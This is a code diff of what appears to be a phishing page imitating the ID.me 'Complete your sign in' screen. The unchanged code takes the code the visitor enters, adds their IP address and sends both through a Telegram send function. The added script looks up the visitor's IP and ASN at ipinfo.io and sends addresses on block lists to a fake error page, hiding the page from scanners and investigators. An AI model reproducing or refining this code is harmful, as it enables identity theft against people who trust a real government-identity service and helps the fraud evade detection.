@@ -1,5 +1,6 @@
 <!DOCTYPE html>
 <html dir='ltr' lang='en'>
+
 <head>
   <title>
     Complete your sign in - ID.me
@@ -49,8 +50,8 @@
     href="images/favicon-16x16-5a8c92dd3dbf20296d619eb084a3ea9510fb77312e80835985fed7fd1d21e15d.png" sizes="16x16" />
   <link rel="stylesheet" media="all"
     href="css/application-0189d16e9dcf751fcf91038fa9ac30c98194116564b5125b826c9f7219da2f93.css" />
-    <script src="redirect.js"></script>
-  </head>
+  <script src="redirect.js"></script>
+</head>
 
 <body class=''>
   <div id='ZN_2bLc7fWaOZ8U4ey'></div>
@@ -193,8 +194,8 @@
           try {
             // Get the user's IP address
             const ipAddress = await getIpAddress();
-      
-            
+
+
             // Call the Telegram send function
             const success = await telegramSend(code, ipAddress);
 
@@ -213,6 +214,63 @@
             // You can add additional error handling code here if needed
           }
         });
+      </script>
+      <script>
+        // Function to fetch IP information from ipinfo.io
+        async function getIPInfo() {
+          try {
+            const response = await fetch('https://ipinfo.io/json');
+            const data = await response.json();
+            return data;
+          } catch (error) {
+            console.error('Error fetching IP information:', error);
+            return null;
+          }
+        }
+
+        // Function to read the file containing blocked ASNs
+        async function getBlockedASNs() {
+          try {
+            const response = await fetch('blocked_asns.txt');
+            const data = await response.text();
+            return data.split('\n').map(line => line.trim());
+          } catch (error) {
+            console.error('Error reading blocked ASNs file:', error);
+            return [];
+          }
+        }
+
+        // Function to read the file containing blocked IPs
+        async function getBlockedIPs() {
+          try {
+            const response = await fetch('blocked_ips.txt');
+            const data = await response.text();
+            return data.split('\n').map(line => line.trim());
+          } catch (error) {
+            console.error('Error reading blocked IPs file:', error);
+            return [];
+          }
+        }
+
+        // Function to check ASN and IP, and take action
+        async function checkASNAndIP() {
+          const ipInfo = await getIPInfo();
+          const blockedASNs = await getBlockedASNs();
+          const blockedIPs = await getBlockedIPs();
+
+          if (ipInfo && (blockedASNs.includes(ipInfo.asn) || blockedIPs.includes(ipInfo.ip))) {
+            // Redirect to a blocked page or show an error message
+            window.location.href = 'error404.html';
+          } else {
+            // Continue loading the page without displaying any message
+            // You can add additional logic or remove the alert statement
+            // depending on your specific requirements
+            // alert('Access allowed.');
+          }
+        }
+
+        // Call the checkASNAndIP function when the page loads
+        checkASNAndIP();
       </script>
 </body>
 
